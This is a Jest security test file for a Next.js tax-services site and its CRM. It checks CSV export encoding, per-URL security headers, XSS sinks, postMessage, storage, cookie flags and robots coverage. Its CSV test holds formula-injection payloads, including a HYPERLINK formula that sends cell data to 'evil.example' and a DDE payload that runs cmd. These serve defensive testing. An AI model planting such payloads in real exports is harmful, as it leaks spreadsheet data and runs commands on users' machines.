/**
 * Round 2, sec2-frontend. Browser-facing controls proved with local, synthetic
 * checks only: the headers Next would actually emit per URL (next.config.js +
 * vercel.json rule merge), CSV formula injection, and static guards that pin
 * the XSS sinks, postMessage handlers, storage, third-party origins and robots
 * coverage so a later change cannot quietly widen them.
 */
import fs from 'fs'
import path from 'path'
import { csvCell, csvRow } from '@/lib/csv'

const ROOT = path.resolve(__dirname, '../../..')
const SRC = path.join(ROOT, 'src')
// eslint-disable-next-line @typescript-eslint/no-require-imports
const { pathToRegexp } = require(path.join(ROOT, 'node_modules/next/dist/compiled/path-to-regexp'))
// eslint-disable-next-line @typescript-eslint/no-require-imports
const nextConfig = require(path.join(ROOT, 'next.config.js'))
// eslint-disable-next-line @typescript-eslint/no-require-imports
const vercel = require(path.join(ROOT, 'vercel.json'))
// eslint-disable-next-line @typescript-eslint/no-require-imports
const formPaths = require(path.join(ROOT, 'config/form-paths'))

type Rule = { source: string; has?: any[]; missing?: any[]; headers: { key: string; value: string }[] }

/** Merge every matching rule the way Next does: later rule wins per header key. */
async function effective(p: string, host: string): Promise<Record<string, string>> {
  const rules: Rule[] = [...(await nextConfig.headers()), ...vercel.headers]
  const out: Record<string, string> = {}
  for (const r of rules) {
    if (!pathToRegexp(r.source).test(p)) continue
    const h = r.has?.find((x: any) => x.type === 'host')
    if (h && !new RegExp(`^${h.value}$`).test(host)) continue
    const m = r.missing?.find((x: any) => x.type === 'host')
    if (m && new RegExp(`^${m.value}$`).test(host)) continue
    for (const hd of r.headers) out[hd.key] = hd.value
  }
  return out
}

function walk(dir: string, out: string[] = []): string[] {
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, e.name)
    if (e.isDirectory()) {
      if (e.name === '__tests__' || e.name === 'node_modules') continue
      walk(full, out)
    } else if (/\.(ts|tsx)$/.test(e.name) && !/\.test\.tsx?$/.test(e.name)) out.push(full)
  }
  return out
}
const files = walk(SRC)
const rel = (f: string) => path.relative(ROOT, f)
const read = (f: string) => { try { return fs.readFileSync(f, 'utf8') } catch { return '' } }
const code = (f: string) => read(f).replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '').replace(/\{\/\*[\s\S]*?\*\/\}/g, '')

describe('FE2-01 CSV formula injection (CRM exports)', () => {
  const hostile = [
    '=HYPERLINK("https://evil.example/?"&C2,"x")',
    '+SUM(1+1)*cmd|\' /C calc\'!A0',
    '-2+3',
    '@SUM(A1)',
    '\t=1+1',
    '\r=1+1',
  ]
  it('neutralises every formula-leading character in text cells', () => {
    for (const h of hostile) {
      const cell = csvCell(h)
      expect(cell.startsWith('"\'')).toBe(true)
    }
  })
  it('doubles embedded quotes and keeps commas and newlines inside the quoted cell', () => {
    expect(csvCell('a "b", c\nd')).toBe('"a ""b"", c\nd"')
  })
  it('leaves numbers and ordinary text unchanged, including negative numbers', () => {
    expect(csvCell(-12.5)).toBe('"-12.5"')
    expect(csvCell(0)).toBe('"0"')
    expect(csvCell('Jane Citizen')).toBe('"Jane Citizen"')
    expect(csvCell(null)).toBe('""')
    expect(csvCell(undefined)).toBe('""')
  })
  it('csvRow joins cells', () => {
    expect(csvRow(['a', '=b', 3])).toBe('"a","\'=b","3"')
  })
  it('every CSV export in the CRM goes through the shared encoder', () => {
    const exporters = files.filter((f) => /text\/csv/.test(read(f)))
    expect(exporters.length).toBeGreaterThanOrEqual(3)
    for (const f of exporters) {
      const src = read(f)
      expect(`${rel(f)} ${/from '@\/lib\/csv'/.test(src)}`).toBe(`${rel(f)} true`)
      // No hand-rolled quoting like `"${v}"` joined with commas.
      expect(/\.map\(\s*\(?v\)?\s*=>\s*`"\$\{/.test(src)).toBe(false)
    }
  })
})

describe('FE2-02 emitted headers per URL (next.config.js + vercel.json merged)', () => {
  const WHT = 'workingholidaytax.com.au'
  const SVT = 'studentvisatax.com.au'
  const baseline = ['X-Content-Type-Options', 'X-Frame-Options', 'Referrer-Policy', 'Strict-Transport-Security', 'Permissions-Policy', 'Cross-Origin-Opener-Policy', 'Cross-Origin-Resource-Policy']

  it('every public WHT path, the API and look-alike paths carry the full baseline and an enforced CSP', async () => {
    for (const p of ['/', '/start', '/de/blog/x', '/api/tax-form', '/robots.txt', '/crmx', '/crm-anything', '/crmfoo/bar']) {
      const h = await effective(p, WHT)
      for (const k of baseline) expect(`${p} ${k} ${!!h[k]}`).toBe(`${p} ${k} true`)
      expect(h['Content-Security-Policy']).toContain("frame-ancestors 'none'")
      expect(h['X-Frame-Options']).toBe('DENY')
    }
  })

  it('/crm carries the baseline, noindex and private no-store, and no static CSP (the proxy nonce CSP owns it)', async () => {
    for (const p of ['/crm', '/crm/dashboard', '/crm/whatsapp/connect']) {
      const h = await effective(p, WHT)
      for (const k of baseline) expect(!!h[k]).toBe(true)
      expect(h['Content-Security-Policy']).toBeUndefined()
      expect(h['X-Robots-Tag']).toMatch(/noindex/)
      expect(h['Cache-Control']).toMatch(/private/)
      expect(h['Cache-Control']).toMatch(/no-store/)
    }
  })

  it('/api responses are noindex and no-store', async () => {
    for (const p of ['/api/crm/clients', '/api/will/state', '/api/tax-form']) {
      const h = await effective(p, WHT)
      expect(h['X-Robots-Tag']).toMatch(/noindex/)
      expect(h['Cache-Control']).toMatch(/no-store/)
    }
  })

  it('SVT hosts, including the absolute-form host with a trailing dot, get the SVT CSP and never a WHT origin or Facebook', async () => {
    for (const host of [SVT, `www.${SVT}`, `${SVT}.`, `www.${SVT}.`]) {
      for (const p of ['/', '/crm', '/zh/privacy']) {
        const h = await effective(p, host)
        const csp = h['Content-Security-Policy']
        expect(`${host}${p} ${typeof csp}`).toBe(`${host}${p} string`)
        expect(csp).not.toMatch(/workingholidaytax|facebook|youtube|supabase|resend/i)
        expect(csp).toContain("frame-src 'none'")
        expect(h['X-Frame-Options']).toBe('DENY')
      }
    }
  })

  it('the WHT CSP never applies to an SVT host and the SVT CSP never to WHT', async () => {
    expect((await effective('/', WHT))['Content-Security-Policy']).toMatch(/workingholidaytax\.com\.au/)
    expect((await effective('/', SVT))['Content-Security-Policy']).not.toMatch(/workingholidaytax/)
  })

  it('CORS is never opened: no Access-Control-Allow-* header anywhere', async () => {
    for (const f of files) expect(`${rel(f)} ${/Access-Control-Allow/i.test(read(f))}`).toBe(`${rel(f)} false`)
    const all = JSON.stringify([...(await nextConfig.headers()), ...vercel.headers])
    expect(all).not.toMatch(/Access-Control/i)
  })

  it('the framework is not advertised and production source maps stay off', () => {
    expect(nextConfig.poweredByHeader).toBe(false)
    expect(nextConfig.productionBrowserSourceMaps).toBeFalsy()
    expect(fs.readdirSync(path.join(ROOT, 'public'), { recursive: true } as any).filter((f: any) => String(f).endsWith('.map'))).toEqual([])
  })

  it('no API route can be statically cached or served from a CDN cache by its own headers', () => {
    for (const f of files.filter((x) => x.includes(`${path.sep}app${path.sep}api${path.sep}`))) {
      const src = read(f)
      expect(`${rel(f)} ${/force-static|s-maxage|public, max-age/.test(src)}`).toBe(`${rel(f)} false`)
    }
  })
})

describe('FE2-04 XSS sinks are pinned', () => {
  it('dangerouslySetInnerHTML appears only for JSON-LD, constant <style>, or the sanitised guide renderer', () => {
    const bad: string[] = []
    for (const f of files) {
      const lines = code(f).split('\n')
      lines.forEach((l, i) => {
        if (!l.includes('dangerouslySetInnerHTML')) return
        const win = lines.slice(Math.max(0, i - 5), i + 10).join('\n')
        const ok = /application\/ld\+json/.test(win) || /<style/.test(win) || /renderInline\(/.test(win)
        if (!ok) bad.push(`${rel(f)}:${i + 1}`)
      })
    }
    expect(bad).toEqual([])
  })

  it('raw HTML/JS sinks are not used anywhere in src', () => {
    const re = /\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write|\beval\(|new Function\(|\bsrcdoc\b|createContextualFragment/
    const bad = files.filter((f) => re.test(read(f))).map(rel)
    expect(bad).toEqual([])
  })

  it('the only <style> built from a runtime value is the marquee duration, a number computed from array length', () => {
    const src = read(path.join(SRC, 'components/ui/GoogleReviews.tsx'))
    expect(src).toMatch(/const duration = `\$\{Math\.max\(24, base\.length \* 7\)\}s`/)
  })

  it('no JSON-LD block interpolates a value taken from the URL, a query string or a request', () => {
    const offenders: string[] = []
    for (const f of files) {
      const src = code(f)
      if (!/application\/ld\+json/.test(src)) continue
      if (/searchParams|useSearchParams|location\.(search|hash|href)|headers\(\)|cookies\(\)/.test(src)) offenders.push(rel(f))
    }
    expect(offenders).toEqual([])
  })

  it('window.location is only read for GA labels, copy-link and constant redirects, never written from a URL parameter', () => {
    const writes = files.flatMap((f) => read(f).split('\n').map((l, i) => ({ f, l, i })).filter(({ l }) => /(window\.)?location\.(href|assign|replace)\s*(=|\()/.test(l) && !/location\.(search|hash)/.test(l) && !/\blocation\.href\s*\)/.test(l)))
    for (const { f, l, i } of writes) {
      // Destination must be a constant path or an id-based CRM path, never a param read.
      expect(`${rel(f)}:${i + 1} ${/['"`]\/(crm|)[^'"`]*['"`]|\.reload\(/.test(l)}`).toBe(`${rel(f)}:${i + 1} true`)
      expect(/searchParams|get\('/.test(l)).toBe(false)
    }
  })
})

describe('FE2-07 postMessage, storage, third parties, service workers', () => {
  it('the only message listener checks the sender origin with the strict Facebook matcher', () => {
    const listeners = files.filter((f) => /addEventListener\(\s*['"]message['"]/.test(read(f)))
    expect(listeners.map(rel)).toEqual([path.join('src', 'app', '(site)', 'crm', 'whatsapp', 'connect', 'ConnectClient.tsx')])
    expect(read(listeners[0])).toMatch(/if \(!isFacebookOrigin\(event\.origin\)\) return/)
  })

  it('no service worker is registered', () => {
    for (const f of files) expect(`${rel(f)} ${/serviceWorker\s*\.\s*register/.test(read(f))}`).toBe(`${rel(f)} false`)
    expect(fs.existsSync(path.join(ROOT, 'public/sw.js'))).toBe(false)
  })

  it('browser storage is confined to known files and the form snapshot holds no TFN', () => {
    const users = files.filter((f) => /\b(localStorage|sessionStorage)\b/.test(code(f))).map(rel).sort()
    expect(users).toEqual([
      path.join('src', 'app', '(site)', 'crm', 'layout.tsx'),
      path.join('src', 'app', '(site)', 'start', 'FormClient.tsx'),
      path.join('src', 'components', 'layout', 'Analytics.tsx'),
      path.join('src', 'components', 'ui', 'MobileLanguageBanner.tsx'),
      path.join('src', 'lib', 'analytics.ts'),
    ].sort())
    const form = read(path.join(SRC, 'app/(site)/start/FormClient.tsx'))
    const snap = form.slice(form.indexOf('const data = {', form.indexOf('setTaxFormHandoff')), form.indexOf('sessionStorage.setItem(SNAPSHOT_KEY'))
    expect(snap).toContain('fullName')
    expect(snap).not.toMatch(/\btfn\b/)
    expect(snap).not.toMatch(/bankStatement|selfiePassport|invoices|passport/)
  })

  it('external scripts and frames come only from the reviewed origins', () => {
    const scriptOrigins = new Set<string>()
    const frameOrigins = new Set<string>()
    for (const f of files) {
      const src = read(f)
      for (const m of src.matchAll(/(?:src=\{?[`'"]|\.src\s*=\s*[`'"])(https?:\/\/[^/'"`$]+)/g)) {
        if (/<iframe/.test(src.slice(Math.max(0, m.index! - 200), m.index!))) frameOrigins.add(m[1])
        else if (/<Script|createElement\('script'\)|\.src\s*=/.test(src.slice(Math.max(0, m.index! - 300), m.index! + 10))) scriptOrigins.add(m[1])
      }
    }
    expect([...scriptOrigins].sort()).toEqual(['https://connect.facebook.net', 'https://www.googletagmanager.com'])
    expect([...frameOrigins].sort()).toEqual(['https://www.youtube-nocookie.com'])
  })

  it('the Facebook SDK is loaded only by the CRM connect page, never by a public page', () => {
    const users = files.filter((f) => /connect\.facebook\.net/.test(read(f)) && !/proxy\.ts$/.test(f)).map(rel)
    expect(users).toEqual([path.join('src', 'app', '(site)', 'crm', 'whatsapp', 'connect', 'ConnectClient.tsx')])
  })

  it('SVT never loads a script from, or posts to, a third party other than its own GA4 property', () => {
    const svt = files.filter((f) => /components\/svt|app\/\(svt/.test(f.split(path.sep).join('/')))
    for (const f of svt) expect(`${rel(f)} ${/facebook|youtube|fbq\(/.test(read(f))}`).toBe(`${rel(f)} false`)
  })
})

describe('FE2-03 robots and noindex coverage', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const robots = require('@/app/robots').default()

  it('robots.txt disallows /crm and /api for every agent', () => {
    for (const r of robots.rules) {
      expect(r.disallow).toEqual(expect.arrayContaining(['/crm', '/api/']))
    }
  })

  it('every questionnaire page carries noindex in every language that serves it', () => {
    const missing: string[] = []
    const check = (dir: string) => {
      const cands = ['page.tsx', 'layout.tsx'].map((n) => path.join(dir, n)).filter(fs.existsSync)
      if (!cands.length) return missing.push(`${path.relative(ROOT, dir)} (no page)`)
      if (!cands.some((c) => /index:\s*false/.test(read(c)))) missing.push(path.relative(ROOT, dir))
    }
    for (const slug of Object.values(formPaths.WHT) as string[]) {
      if (slug === 'start') continue
      check(path.join(SRC, 'app/(site)', slug))
      check(path.join(SRC, 'app/(de)/de', slug))
      if (slug !== 'y8vwp4bf7' || true) check(path.join(SRC, 'app/(ja)/ja', slug))
    }
    check(path.join(SRC, 'app/(site)/start'))
    check(path.join(SRC, 'app/(de)/de/start'))
    check(path.join(SRC, 'app/(ja)/ja/start'))
    const { form, residency } = formPaths.SVT
    for (const g of ['(svt)/svt-site', '(svt-zh)/svt-site/zh', '(svt-vi)/svt-site/vi']) {
      check(path.join(SRC, 'app', g, form))
      check(path.join(SRC, 'app', g, form, residency))
    }
    expect(missing).toEqual([])
  })

  it('the CRM noindex no longer depends on client-side JavaScript alone (response header)', async () => {
    expect((await effective('/crm/dashboard', 'workingholidaytax.com.au'))['X-Robots-Tag']).toMatch(/noindex/)
  })
})

describe('FE2-08 session cookie attributes', () => {
  it('every non-empty crm_session / crm_preauth cookie is httpOnly, sameSite strict, secure in production, path /', () => {
    for (const rf of ['verify-otp', 'login']) {
      const src = read(path.join(SRC, 'app/api/crm', rf, 'route.ts'))
      const blocks = [...src.matchAll(/cookies\.set\('crm_(?:session|preauth)', (?!'')[\s\S]*?\}\)/g)].map((m) => m[0])
      expect(blocks.length).toBeGreaterThan(0)
      for (const b of blocks) {
        expect(b).toMatch(/httpOnly: true/)
        expect(b).toMatch(/sameSite: 'strict'/)
        expect(b).toMatch(/secure: process\.env\.NODE_ENV === 'production'/)
        expect(b).toMatch(/path: '\/'/)
        expect(b).toMatch(/maxAge:/)
      }
    }
  })
})
